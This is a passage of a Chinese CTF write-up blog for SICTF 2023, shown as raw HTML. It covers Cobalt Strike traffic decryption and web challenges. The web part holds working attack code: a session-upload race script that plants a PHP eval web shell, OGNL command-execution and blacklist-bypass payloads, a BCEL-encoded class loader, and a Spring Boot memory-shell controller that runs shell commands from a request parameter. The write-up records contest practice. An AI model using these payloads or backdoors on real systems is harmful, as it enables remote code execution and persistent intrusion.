class="hljs dust"><span class="language-xml">SICTF</span><span class="hljs-template-variable">&#123;SHUMUISAGOODBOYYYYYYYYY&#125;</span></code></pre></div><h3 id="一起上号不"><a href="#一起上号不" class="headerlink" title="一起上号不"></a>一起上号不</h3><p>有关cs的流量分析，应该去找类似的题目的，但当时并不怎么想做，大佬们也是参照别的文章的解题顺序做的</p><p>导出http对象，获得一个key.zip，利用工具解密cobalstrike公钥和私钥</p><p><a href="https://github.com/Slzdude/cs-scripts">Slzdude&#x2F;cs-scripts: 研究CobaltStrike时的一些副产品 (github.com)</a></p><p>因为虚拟机坏了，只能先拿<code>unknown</code>师傅的图了</p><p><img src="/2023/09/10/sictf2023/image-20230910202300228.png" alt="image-20230910202300228"></p><p>有了私钥，拿去解<code>/load</code>路由中cookie中的元数据，拿到AES_KEY，HMAC_KEY</p><p><a href="https://github.com/WBGlIl/CS_Decrypt">WBGlIl&#x2F;CS_Decrypt (github.com)</a></p><p><img src="/2023/09/10/sictf2023/image-20230910202637906.png" alt="image-20230910202637906"></p><p>然后找到<code>/submit.php</code>下发送的POST请求内容</p><p>先hex解密再base64加密</p><p><img src="/2023/09/10/sictf2023/image-20230910202825317.png" alt="image-20230910202825317"></p><p><img src="/2023/09/10/sictf2023/image-20230910202851419.png" alt="image-20230910202851419"></p><p>总结下顺序：</p><ol><li>解密key文件，得到<code>private-key</code></li><li>拿到cookie中的元数据，解密出<code>AES_KEY</code>，<code>HMAC_KEY</code></li><li>找到<code>/submit.php</code>的数据，先hex解密再base64加密，然后跑脚本</li></ol><h3 id="还不上号-（easy-shark和一起上号的组合）"><a href="#还不上号-（easy-shark和一起上号的组合）" class="headerlink" title="还不上号 （easy_shark和一起上号的组合）"></a>还不上号 （easy_shark和一起上号的组合）</h3><p>两个流量包</p><p>内容高度一致，就说一下不同点吧</p><p>包一对比<code>easy_shark</code>缺少<code>key</code>（但我自己找不到<code>shell.php</code>的内容）</p><p>而包二中导出<strong>http</strong>对象有<code>key.zip</code></p><p>压缩包有加密，也没法进行明文攻击，那么就ziprello爆破，爆破得到密码<code>we1l</code></p><p>发现零宽字符隐写，解密时要点上这两个</p><p><img src="/2023/09/10/sictf2023/image-20230910210453746.png" alt="image-20230910210453746"></p><div class="code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span>52f1488563bf0e</code></pre></div><p>然后按照easy_shark的方式解密</p><p>得到两个文件</p><p>flag.txt：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">SICTF</span>&#123;<span class="hljs-number">79</span>e1755e-<span class="hljs-number">08</span>a8-<span class="hljs-number">4</span>d</code></pre></div><p>key：<img src="/2023/09/10/sictf2023/image-20230910211920890.png" alt="image-20230910211920890"></p><p>剩下的和<code>一起上号不</code>一样</p><p>最后得到了个base32</p><p><img src="/2023/09/10/sictf2023/image-20230910212103449.png" alt="image-20230910212103449"></p><p>解密即可</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="include（签到）"><a href="#include（签到）" class="headerlink" title="include（签到）"></a>include（签到）</h3><p>很简单filter伪协议就可以</p><p>这里我尝试包含pearcmd.php （我虽然知道这种解法，但每次看到<code>include</code>都想不起来可以用这个）</p><p><img src="/2023/09/10/sictf2023/image-20230910212926345.png" alt="image-20230910212926345"></p><p><img src="/2023/09/10/sictf2023/image-20230910212949221.png" alt="image-20230910212949221"></p><h3 id="我全都要（拿了个二血）"><a href="#我全都要（拿了个二血）" class="headerlink" title="我全都要（拿了个二血）"></a>我全都要（拿了个二血）</h3><p>pop链不说了</p><h3 id="你能跟得上我的speed吗"><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h3><p>当时看到传不上去就想着条件竞争，但是不会操作</p><p>我印象中的竞争有session条件竞争，然后就是多线程</p><p>看了unknow师傅的wp，可以使用session的脚本</p><p>偷师傅的脚本</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><span class="hljs-comment"># Author：Y4tacker</span><span class="hljs-keyword">import</span> io<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> threadingsessid = <span class="hljs-string">&#x27;yyy&#x27;</span>url = <span class="hljs-string">&quot;http://210.44.151.51:10418/upload.php&quot;</span><span class="hljs-comment">##这里小改了一下</span>php = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">&lt;?php</span><span class="hljs-string">file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php eval($_GET[&quot;c&quot;]);?&gt;&#x27;);</span><span class="hljs-string">echo &#x27;bingo&#x27;;&#x27;&#x27;&#x27;</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        f = php        resp = session.post(url,                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">f&quot;123123213123&quot;</span>&#125;,                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;1.php&#x27;</span>, f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        resp = session.get(<span class="hljs-string">&#x27;http://210.44.151.51:10418/uploads/1.php&#x27;</span>)        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;bingo&quot;</span> <span class="hljs-keyword">in</span> resp.text:            <span class="hljs-built_in">print</span>(resp.text)            <span class="hljs-keyword">break</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    event = threading.Event()    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):            threading.Thread(target=write, args=(session,)).start()        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):            threading.Thread(target=read, args=(session,)).start()    event.<span class="hljs-built_in">set</span>()</code></pre></div><p><img src="/2023/09/10/sictf2023/image-20230910214204467.png" alt="image-20230910214204467"></p><h3 id="pain-（看了四种解法）"><a href="#pain-（看了四种解法）" class="headerlink" title="pain （看了四种解法）"></a>pain （看了四种解法）</h3><p>考察OGNL表达式</p><p>正常的命令执行是下面这样</p><div class="code-wrapper"><pre><code class="hljs reasonml">OgnlContext context = <span class="hljs-keyword">new</span> <span class="hljs-constructor">OgnlContext()</span>;<span class="hljs-comment">//context.setRoot(test);</span><span class="hljs-comment">//表达式</span>String express = <span class="hljs-string">&quot;(#a=@java.lang.Runtime@getRuntime.exec(&#x27;calc&#x27;)&quot;</span>;<span class="hljs-comment">//(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()</span>Object ognl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Ognl</span>.</span></span>parse<span class="hljs-constructor">Expression(<span class="hljs-params">express</span>)</span>;Object value = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Ognl</span>.</span></span>get<span class="hljs-constructor">Value(<span class="hljs-params">ognl</span>,<span class="hljs-params">context</span>,<span class="hljs-params">context</span>.<span class="hljs-params">getRoot</span>()</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(value);</code></pre></div><p>题目黑名单</p><p><img src="/image-20230911153225651.png" alt="image-20230911153225651"></p><h4 id="unicode绕过"><a href="#unicode绕过" class="headerlink" title="unicode绕过"></a>unicode绕过</h4><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@java</span>.lang.\u0052untime<span class="hljs-variable">@g</span>\u0065t\<span class="hljs-built_in">u0052untime</span>().\<span class="hljs-built_in">u0065xec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div><p>记得url编码（我当时想的就是unicode，但没url编码网页报错400不知道咋办了）</p><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><div class="code-wrapper"><pre><code class="hljs clojure">(<span class="hljs-name">#a=new</span> java.util.Scanner(<span class="hljs-name"><span class="hljs-built_in">new</span></span> java.io.File(<span class="hljs-string">&quot;/flag&quot;</span>)).next())</code></pre></div><p>妙妙妙妙啊</p><h4 id="bcel字节码（unknow师傅的解法）"><a href="#bcel字节码（unknow师傅的解法）" class="headerlink" title="bcel字节码（unknow师傅的解法）"></a>bcel字节码（unknow师傅的解法）</h4><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.util.JavaWrapper;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> App &#123;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main( String[] args ) throws <span class="hljs-keyword">Exception</span>&#123;        //第一种触发方式        //JavaClass javaClass = Repository.lookupClass(Evil.<span class="hljs-keyword">class</span>);        //        //String encode = Utility.encode(javaClass.getBytes(), <span class="hljs-keyword">true</span>);        //        //<span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(encode);        //<span class="hljs-built_in">new</span> ClassLoader().loadClass(&quot;$$BCEL$$&quot;+encode).newInstance();        //第二种触发方式        JavaClass javaClass = Repository.lookupClass(Evil.<span class="hljs-keyword">class</span>);        String encode = Utility.encode(javaClass.getBytes(), <span class="hljs-keyword">true</span>);        JavaWrapper._main(<span class="hljs-built_in">new</span> String[]&#123;&quot;$$BCEL$$&quot;+encode&#125;);        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;$$BCEL$$&quot;+encode);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-comment">//Evil.java</span><span class="hljs-keyword">import</span> java.<span class="hljs-property">io</span>.<span class="hljs-property">IOException</span>;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) &#123;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">_main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(<span class="hljs-string">&quot;calc&quot;</span>);        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);        &#125;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-comment">//使用第一种方法的Evil.java</span><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;    <span class="hljs-keyword">static</span> &#123;        <span class="hljs-keyword">try</span> &#123;            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">RuntimeException</span>(e);        &#125;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">public static void main( String<span class="hljs-literal">[]</span> args ) throws Exception&#123;    JavaClass javaClass = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Repository</span>.</span></span>lookup<span class="hljs-constructor">Class(Evil.<span class="hljs-params">class</span>)</span>;    String encode = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>encode(javaClass.get<span class="hljs-constructor">Bytes()</span>, <span class="hljs-literal">true</span>);    String bcel = <span class="hljs-string">&quot;$$BCEL$$&quot;</span>+encode;    String code = <span class="hljs-string">&quot;@com.sun.org.apache.bcel.internal.util.JavaWrapper@_main(&#123;&#x27;&quot;</span>+bcel+<span class="hljs-string">&quot;&#x27;&#125;.toArray())&quot;</span>;    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URLEncode</span>.</span></span>encode(code));     OgnlContext context = <span class="hljs-keyword">new</span> <span class="hljs-constructor">OgnlContext()</span>;    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Ognl</span>.</span></span>get<span class="hljs-constructor">Value(<span class="hljs-params">code</span>, <span class="hljs-params">context</span>, <span class="hljs-params">context</span>.<span class="hljs-params">getRoot</span>()</span>);&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs dart">#使用ClassLoader(#a=<span class="hljs-keyword">new</span> com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(<span class="hljs-string">&#x27;$<span class="hljs-subst">$BCEL</span>$$<span class="hljs-subst">$l</span><span class="hljs-subst">$8b</span><span class="hljs-subst">$I</span><span class="hljs-subst">$A</span><span class="hljs-subst">$A</span><span class="hljs-subst">$A</span><span class="hljs-subst">$A</span><span class="hljs-subst">$A</span><span class="hljs-subst">$A</span><span class="hljs-subst">$AmRKO</span><span class="hljs-subst">$c2</span><span class="hljs-subst">$40</span><span class="hljs-subst">$Q</span><span class="hljs-subst">$fe</span><span class="hljs-subst">$W</span><span class="hljs-subst">$90BmEQ</span><span class="hljs-subst">$f0</span><span class="hljs-subst">$fd</span><span class="hljs-subst">$7e</span><span class="hljs-subst">$81</span><span class="hljs-subst">$H</span><span class="hljs-subst">$b9x</span><span class="hljs-subst">$c3x1</span><span class="hljs-subst">$9a</span><span class="hljs-subst">$Y</span><span class="hljs-subst">$eb</span><span class="hljs-subst">$pb0</span><span class="hljs-subst">$k</span><span class="hljs-subst">$cb</span><span class="hljs-subst">$ba</span><span class="hljs-subst">$c2bmM</span><span class="hljs-subst">$v</span><span class="hljs-subst">$ea</span><span class="hljs-subst">$3f</span><span class="hljs-subst">$f2</span><span class="hljs-subst">$ecE</span><span class="hljs-subst">$8d</span><span class="hljs-subst">$sz</span><span class="hljs-subst">$f7G</span><span class="hljs-subst">$ZgWE</span><span class="hljs-subst">$S</span><span class="hljs-subst">$eda</span><span class="hljs-subst">$a63</span><span class="hljs-subst">$dfcf</span><span class="hljs-subst">$db</span><span class="hljs-subst">$7d</span><span class="hljs-subst">$ffx</span><span class="hljs-subst">$7e</span><span class="hljs-subst">$F</span><span class="hljs-subst">$b0</span><span class="hljs-subst">$86</span><span class="hljs-subst">$82</span><span class="hljs-subst">$894FL</span><span class="hljs-subst">$8cb</span><span class="hljs-subst">$y</span><span class="hljs-subst">$85q</span><span class="hljs-subst">$95</span><span class="hljs-subst">$t</span><span class="hljs-subst">$ML</span><span class="hljs-subst">$g</span><span class="hljs-subst">$982</span><span class="hljs-subst">$91</span><span class="hljs-subst">$c4</span><span class="hljs-subst">$b4</span><span class="hljs-subst">$81</span><span class="hljs-subst">$Z</span><span class="hljs-subst">$D</span><span class="hljs-subst">$b3</span><span class="hljs-subst">$M</span><span class="hljs-subst">$c9u</span><span class="hljs-subst">$e9</span><span class="hljs-subst">$cbh</span><span class="hljs-subst">$83</span><span class="hljs-subst">$n</span><span class="hljs-subst">$5e</span><span class="hljs-subst">$uV</span><span class="hljs-subst">$Z</span><span class="hljs-subst">$S</span><span class="hljs-subst">$9b</span><span class="hljs-subst">$c1</span><span class="hljs-subst">$99</span><span class="hljs-subst">$60</span><span class="hljs-subst">$c88</span><span class="hljs-subst">$d2</span><span class="hljs-subst">$X</span><span class="hljs-subst">$fb</span><span class="hljs-subst">$ed</span><span class="hljs-subst">$cb</span><span class="hljs-subst">$9a</span><span class="hljs-subst">$I</span><span class="hljs-subst">$8f</span><span class="hljs-subst">$dd</span><span class="hljs-subst">$9aG</span><span class="hljs-subst">$9d</span><span class="hljs-subst">$ac</span><span class="hljs-subst">$Tp</span><span class="hljs-subst">$d7</span><span class="hljs-subst">$ab</span><span class="hljs-subst">$ba</span><span class="hljs-subst">$a1T</span><span class="hljs-subst">$f5w3</span><span class="hljs-subst">$R5d</span><span class="hljs-subst">$8b</span><span class="hljs-subst">$3c</span><span class="hljs-subst">$9c</span><span class="hljs-subst">$adk</span><span class="hljs-subst">$e9</span><span class="hljs-subst">$95</span><span class="hljs-subst">$ZR</span><span class="hljs-subst">$eb</span><span class="hljs-subst">$dc</span><span class="hljs-subst">$fb</span><span class="hljs-subst">$b6c</span><span class="hljs-subst">$E</span><span class="hljs-subst">$e7</span><span class="hljs-subst">$9c</span><span class="hljs-subst">$a6</span><span class="hljs-subst">$7b</span><span class="hljs-subst">$ed</span><span class="hljs-subst">$96dP</span><span class="hljs-subst">$da9</span><span class="hljs-subst">$d8</span><span class="hljs-subst">$ba</span><span class="hljs-subst">$e5</span><span class="hljs-subst">$e2</span><span class="hljs-subst">$w</span><span class="hljs-subst">$92</span><span class="hljs-subst">$81O4</span><span class="hljs-subst">$bb</span><span class="hljs-subst">$S</span><span class="hljs-subst">$b9</span><span class="hljs-subst">$fcb</span><span class="hljs-subst">$cf</span><span class="hljs-subst">$bd</span><span class="hljs-subst">$d26</span><span class="hljs-subst">$b4</span><span class="hljs-subst">$U</span><span class="hljs-subst">$83Y</span><span class="hljs-subst">$J</span><span class="hljs-subst">$da</span><span class="hljs-subst">$n</span><span class="hljs-subst">$X</span><span class="hljs-subst">$dbR</span><span class="hljs-subst">$d9</span><span class="hljs-subst">$a6</span><span class="hljs-subst">$95</span><span class="hljs-subst">$dd</span><span class="hljs-subst">$aa</span><span class="hljs-subst">$d2Z0</span><span class="hljs-subst">$d1k</span><span class="hljs-subst">$60</span><span class="hljs-subst">$ce</span><span class="hljs-subst">$c2</span><span class="hljs-subst">$3c</span><span class="hljs-subst">$Wh</span><span class="hljs-subst">$k</span><span class="hljs-subst">$ad</span><span class="hljs-subst">$c0</span><span class="hljs-subst">$z</span><span class="hljs-subst">$yb</span><span class="hljs-subst">$89a</span><span class="hljs-subst">$f0</span><span class="hljs-subst">$lo</span><span class="hljs-subst">$861</span><span class="hljs-subst">$dd</span><span class="hljs-subst">$f5</span><span class="hljs-subst">$5c</span><span class="hljs-subst">$bf</span><span class="hljs-subst">$5e</span><span class="hljs-subst">$3aj</span><span class="hljs-subst">$fb</span><span class="hljs-subst">$91</span><span class="hljs-subst">$bc</span><span class="hljs-subst">$U</span><span class="hljs-subst">$jPy</span><span class="hljs-subst">$z</span><span class="hljs-subst">$93</span><span class="hljs-subst">$872g</span><span class="hljs-subst">$e8</span><span class="hljs-subst">$ff</span><span class="hljs-subst">$r</span><span class="hljs-subst">$k</span><span class="hljs-subst">$d4</span><span class="hljs-subst">$9a</span><span class="hljs-subst">$82G</span><span class="hljs-subst">$M</span><span class="hljs-subst">$D</span><span class="hljs-subst">$7f</span><span class="hljs-subst">$b4</span><span class="hljs-subst">$b4W</span><span class="hljs-subst">$5dD</span><span class="hljs-subst">$9d</span><span class="hljs-subst">$oW</span><span class="hljs-subst">$u</span><span class="hljs-subst">$3a</span><span class="hljs-subst">$7f8t</span><span class="hljs-subst">$9e</span><span class="hljs-subst">$84</span><span class="hljs-subst">$b8</span><span class="hljs-subst">$V</span><span class="hljs-subst">$9ca</span><span class="hljs-subst">$b9</span><span class="hljs-subst">$d0</span><span class="hljs-subst">$85V</span><span class="hljs-subst">$a2P</span><span class="hljs-subst">$fa</span><span class="hljs-subst">$f5r</span><span class="hljs-subst">$b7</span><span class="hljs-subst">$e00</span><span class="hljs-subst">$M</span><span class="hljs-subst">$b8h</span><span class="hljs-subst">$b5H0</span><span class="hljs-subst">$d2</span><span class="hljs-subst">$cd</span><span class="hljs-subst">$3cn</span><span class="hljs-subst">$84</span><span class="hljs-subst">$c1</span><span class="hljs-subst">$8d</span><span class="hljs-subst">$fa</span><span class="hljs-subst">$Q</span><span class="hljs-subst">$e5b</span><span class="hljs-subst">$V</span><span class="hljs-subst">$b3H</span><span class="hljs-subst">$d1_SO</span><span class="hljs-subst">$ML</span><span class="hljs-subst">$j</span><span class="hljs-subst">$9e</span><span class="hljs-subst">$a2EU</span><span class="hljs-subst">$892</span><span class="hljs-subst">$a3</span><span class="hljs-subst">$dc</span><span class="hljs-subst">$b3</span><span class="hljs-subst">$f2</span><span class="hljs-subst">$Iv</span><span class="hljs-subst">$afa</span><span class="hljs-subst">$9bbR7</span><span class="hljs-subst">$N</span><span class="hljs-subst">$f4Q</span><span class="hljs-subst">$b4</span><span class="hljs-subst">$be</span><span class="hljs-subst">$I</span><span class="hljs-subst">$c8</span><span class="hljs-subst">$a0</span><span class="hljs-subst">$9fr</span><span class="hljs-subst">$K</span><span class="hljs-subst">$D</span><span class="hljs-subst">$j</span><span class="hljs-subst">$f19</span><span class="hljs-subst">$e2</span><span class="hljs-subst">$g</span><span class="hljs-subst">$h</span><span class="hljs-subst">$7eB</span><span class="hljs-subst">$y</span><span class="hljs-subst">$h</span><span class="hljs-subst">$7f</span><span class="hljs-subst">$40</span><span class="hljs-subst">$e2</span><span class="hljs-subst">$e4</span><span class="hljs-subst">$O</span><span class="hljs-subst">$f6</span><span class="hljs-subst">$ee</span><span class="hljs-subst">$L</span><span class="hljs-subst">$92</span><span class="hljs-subst">$a7</span><span class="hljs-subst">$e4f</span><span class="hljs-subst">$bc</span><span class="hljs-subst">$ddk0M</span><span class="hljs-subst">$d4</span><span class="hljs-subst">$k</span><span class="hljs-subst">$o</span><span class="hljs-subst">$w</span><span class="hljs-subst">$db</span><span class="hljs-subst">$3c</span><span class="hljs-subst">$bd</span><span class="hljs-subst">$B</span><span class="hljs-subst">$ea</span><span class="hljs-subst">$fe</span><span class="hljs-subst">$d8</span><span class="hljs-subst">$d4</span><span class="hljs-subst">$ed</span><span class="hljs-subst">$d51OC</span><span class="hljs-subst">$7e</span><span class="hljs-subst">$c6</span><span class="hljs-subst">$d8</span><span class="hljs-subst">$84d1H</span><span class="hljs-subst">$d5</span><span class="hljs-subst">$90</span><span class="hljs-subst">$k</span><span class="hljs-subst">$ls</span><span class="hljs-subst">$M</span><span class="hljs-subst">$e4</span><span class="hljs-subst">$d2</span><span class="hljs-subst">$E</span><span class="hljs-subst">$e4</span><span class="hljs-subst">$f5f</span><span class="hljs-subst">$c3</span><span class="hljs-subst">$9f</span><span class="hljs-subst">$9e</span><span class="hljs-subst">$b2</span><span class="hljs-subst">$c5O</span><span class="hljs-subst">$84</span><span class="hljs-subst">$C</span><span class="hljs-subst">$A</span><span class="hljs-subst">$A</span>&#x27;</span>)).newInstance()</code></pre></div><p>本地自建的Evil.java，带不带包名都可以，都打得通。（保险起见还是带上吧）</p><h3 id="DoyouknowCC-（不会，先欠着）"><a href="#DoyouknowCC-（不会，先欠着）" class="headerlink" title="DoyouknowCC （不会，先欠着）"></a>DoyouknowCC （不会，先欠着）</h3><p>springboot &gt;2.6内存马</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.controller;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilController</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, NoSuchMethodException, IllegalAccessException &#123;        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class="hljs-number">0</span>);        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> EvilController.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);        field.setAccessible(<span class="hljs-literal">true</span>);        RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> (RequestMappingInfo.BuilderConfiguration) field.get(mappingHandlerMapping);        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/cmd&quot;</span>).options(config).build();        <span class="hljs-type">EvilController</span> <span class="hljs-variable">springBootMemoryShellOfController</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EvilController</span>(<span class="hljs-string">&quot;aaaaaaa&quot;</span>);        mappingHandlerMapping.registerMapping(info,springBootMemoryShellOfController,method);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilController</span><span class="hljs-params">(String test)</span>&#123;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getRequest();        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getResponse();        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);        <span class="hljs-keyword">if</span> (command!=<span class="hljs-literal">null</span>)&#123;            <span class="hljs-keyword">try</span> &#123;                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> response.getWriter();                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;                ProcessBuilder p;                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, command&#125;);                &#125; <span class="hljs-keyword">else</span> &#123;                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, command&#125;);                &#125;                java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);                o = c.hasNext() ? c.next() : o;                c.close();                printWriter.write(o);                printWriter.flush();                printWriter.close();            &#125;<span class="hljs-keyword">catch</span> (Exception ignored)&#123;            &#125;        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span 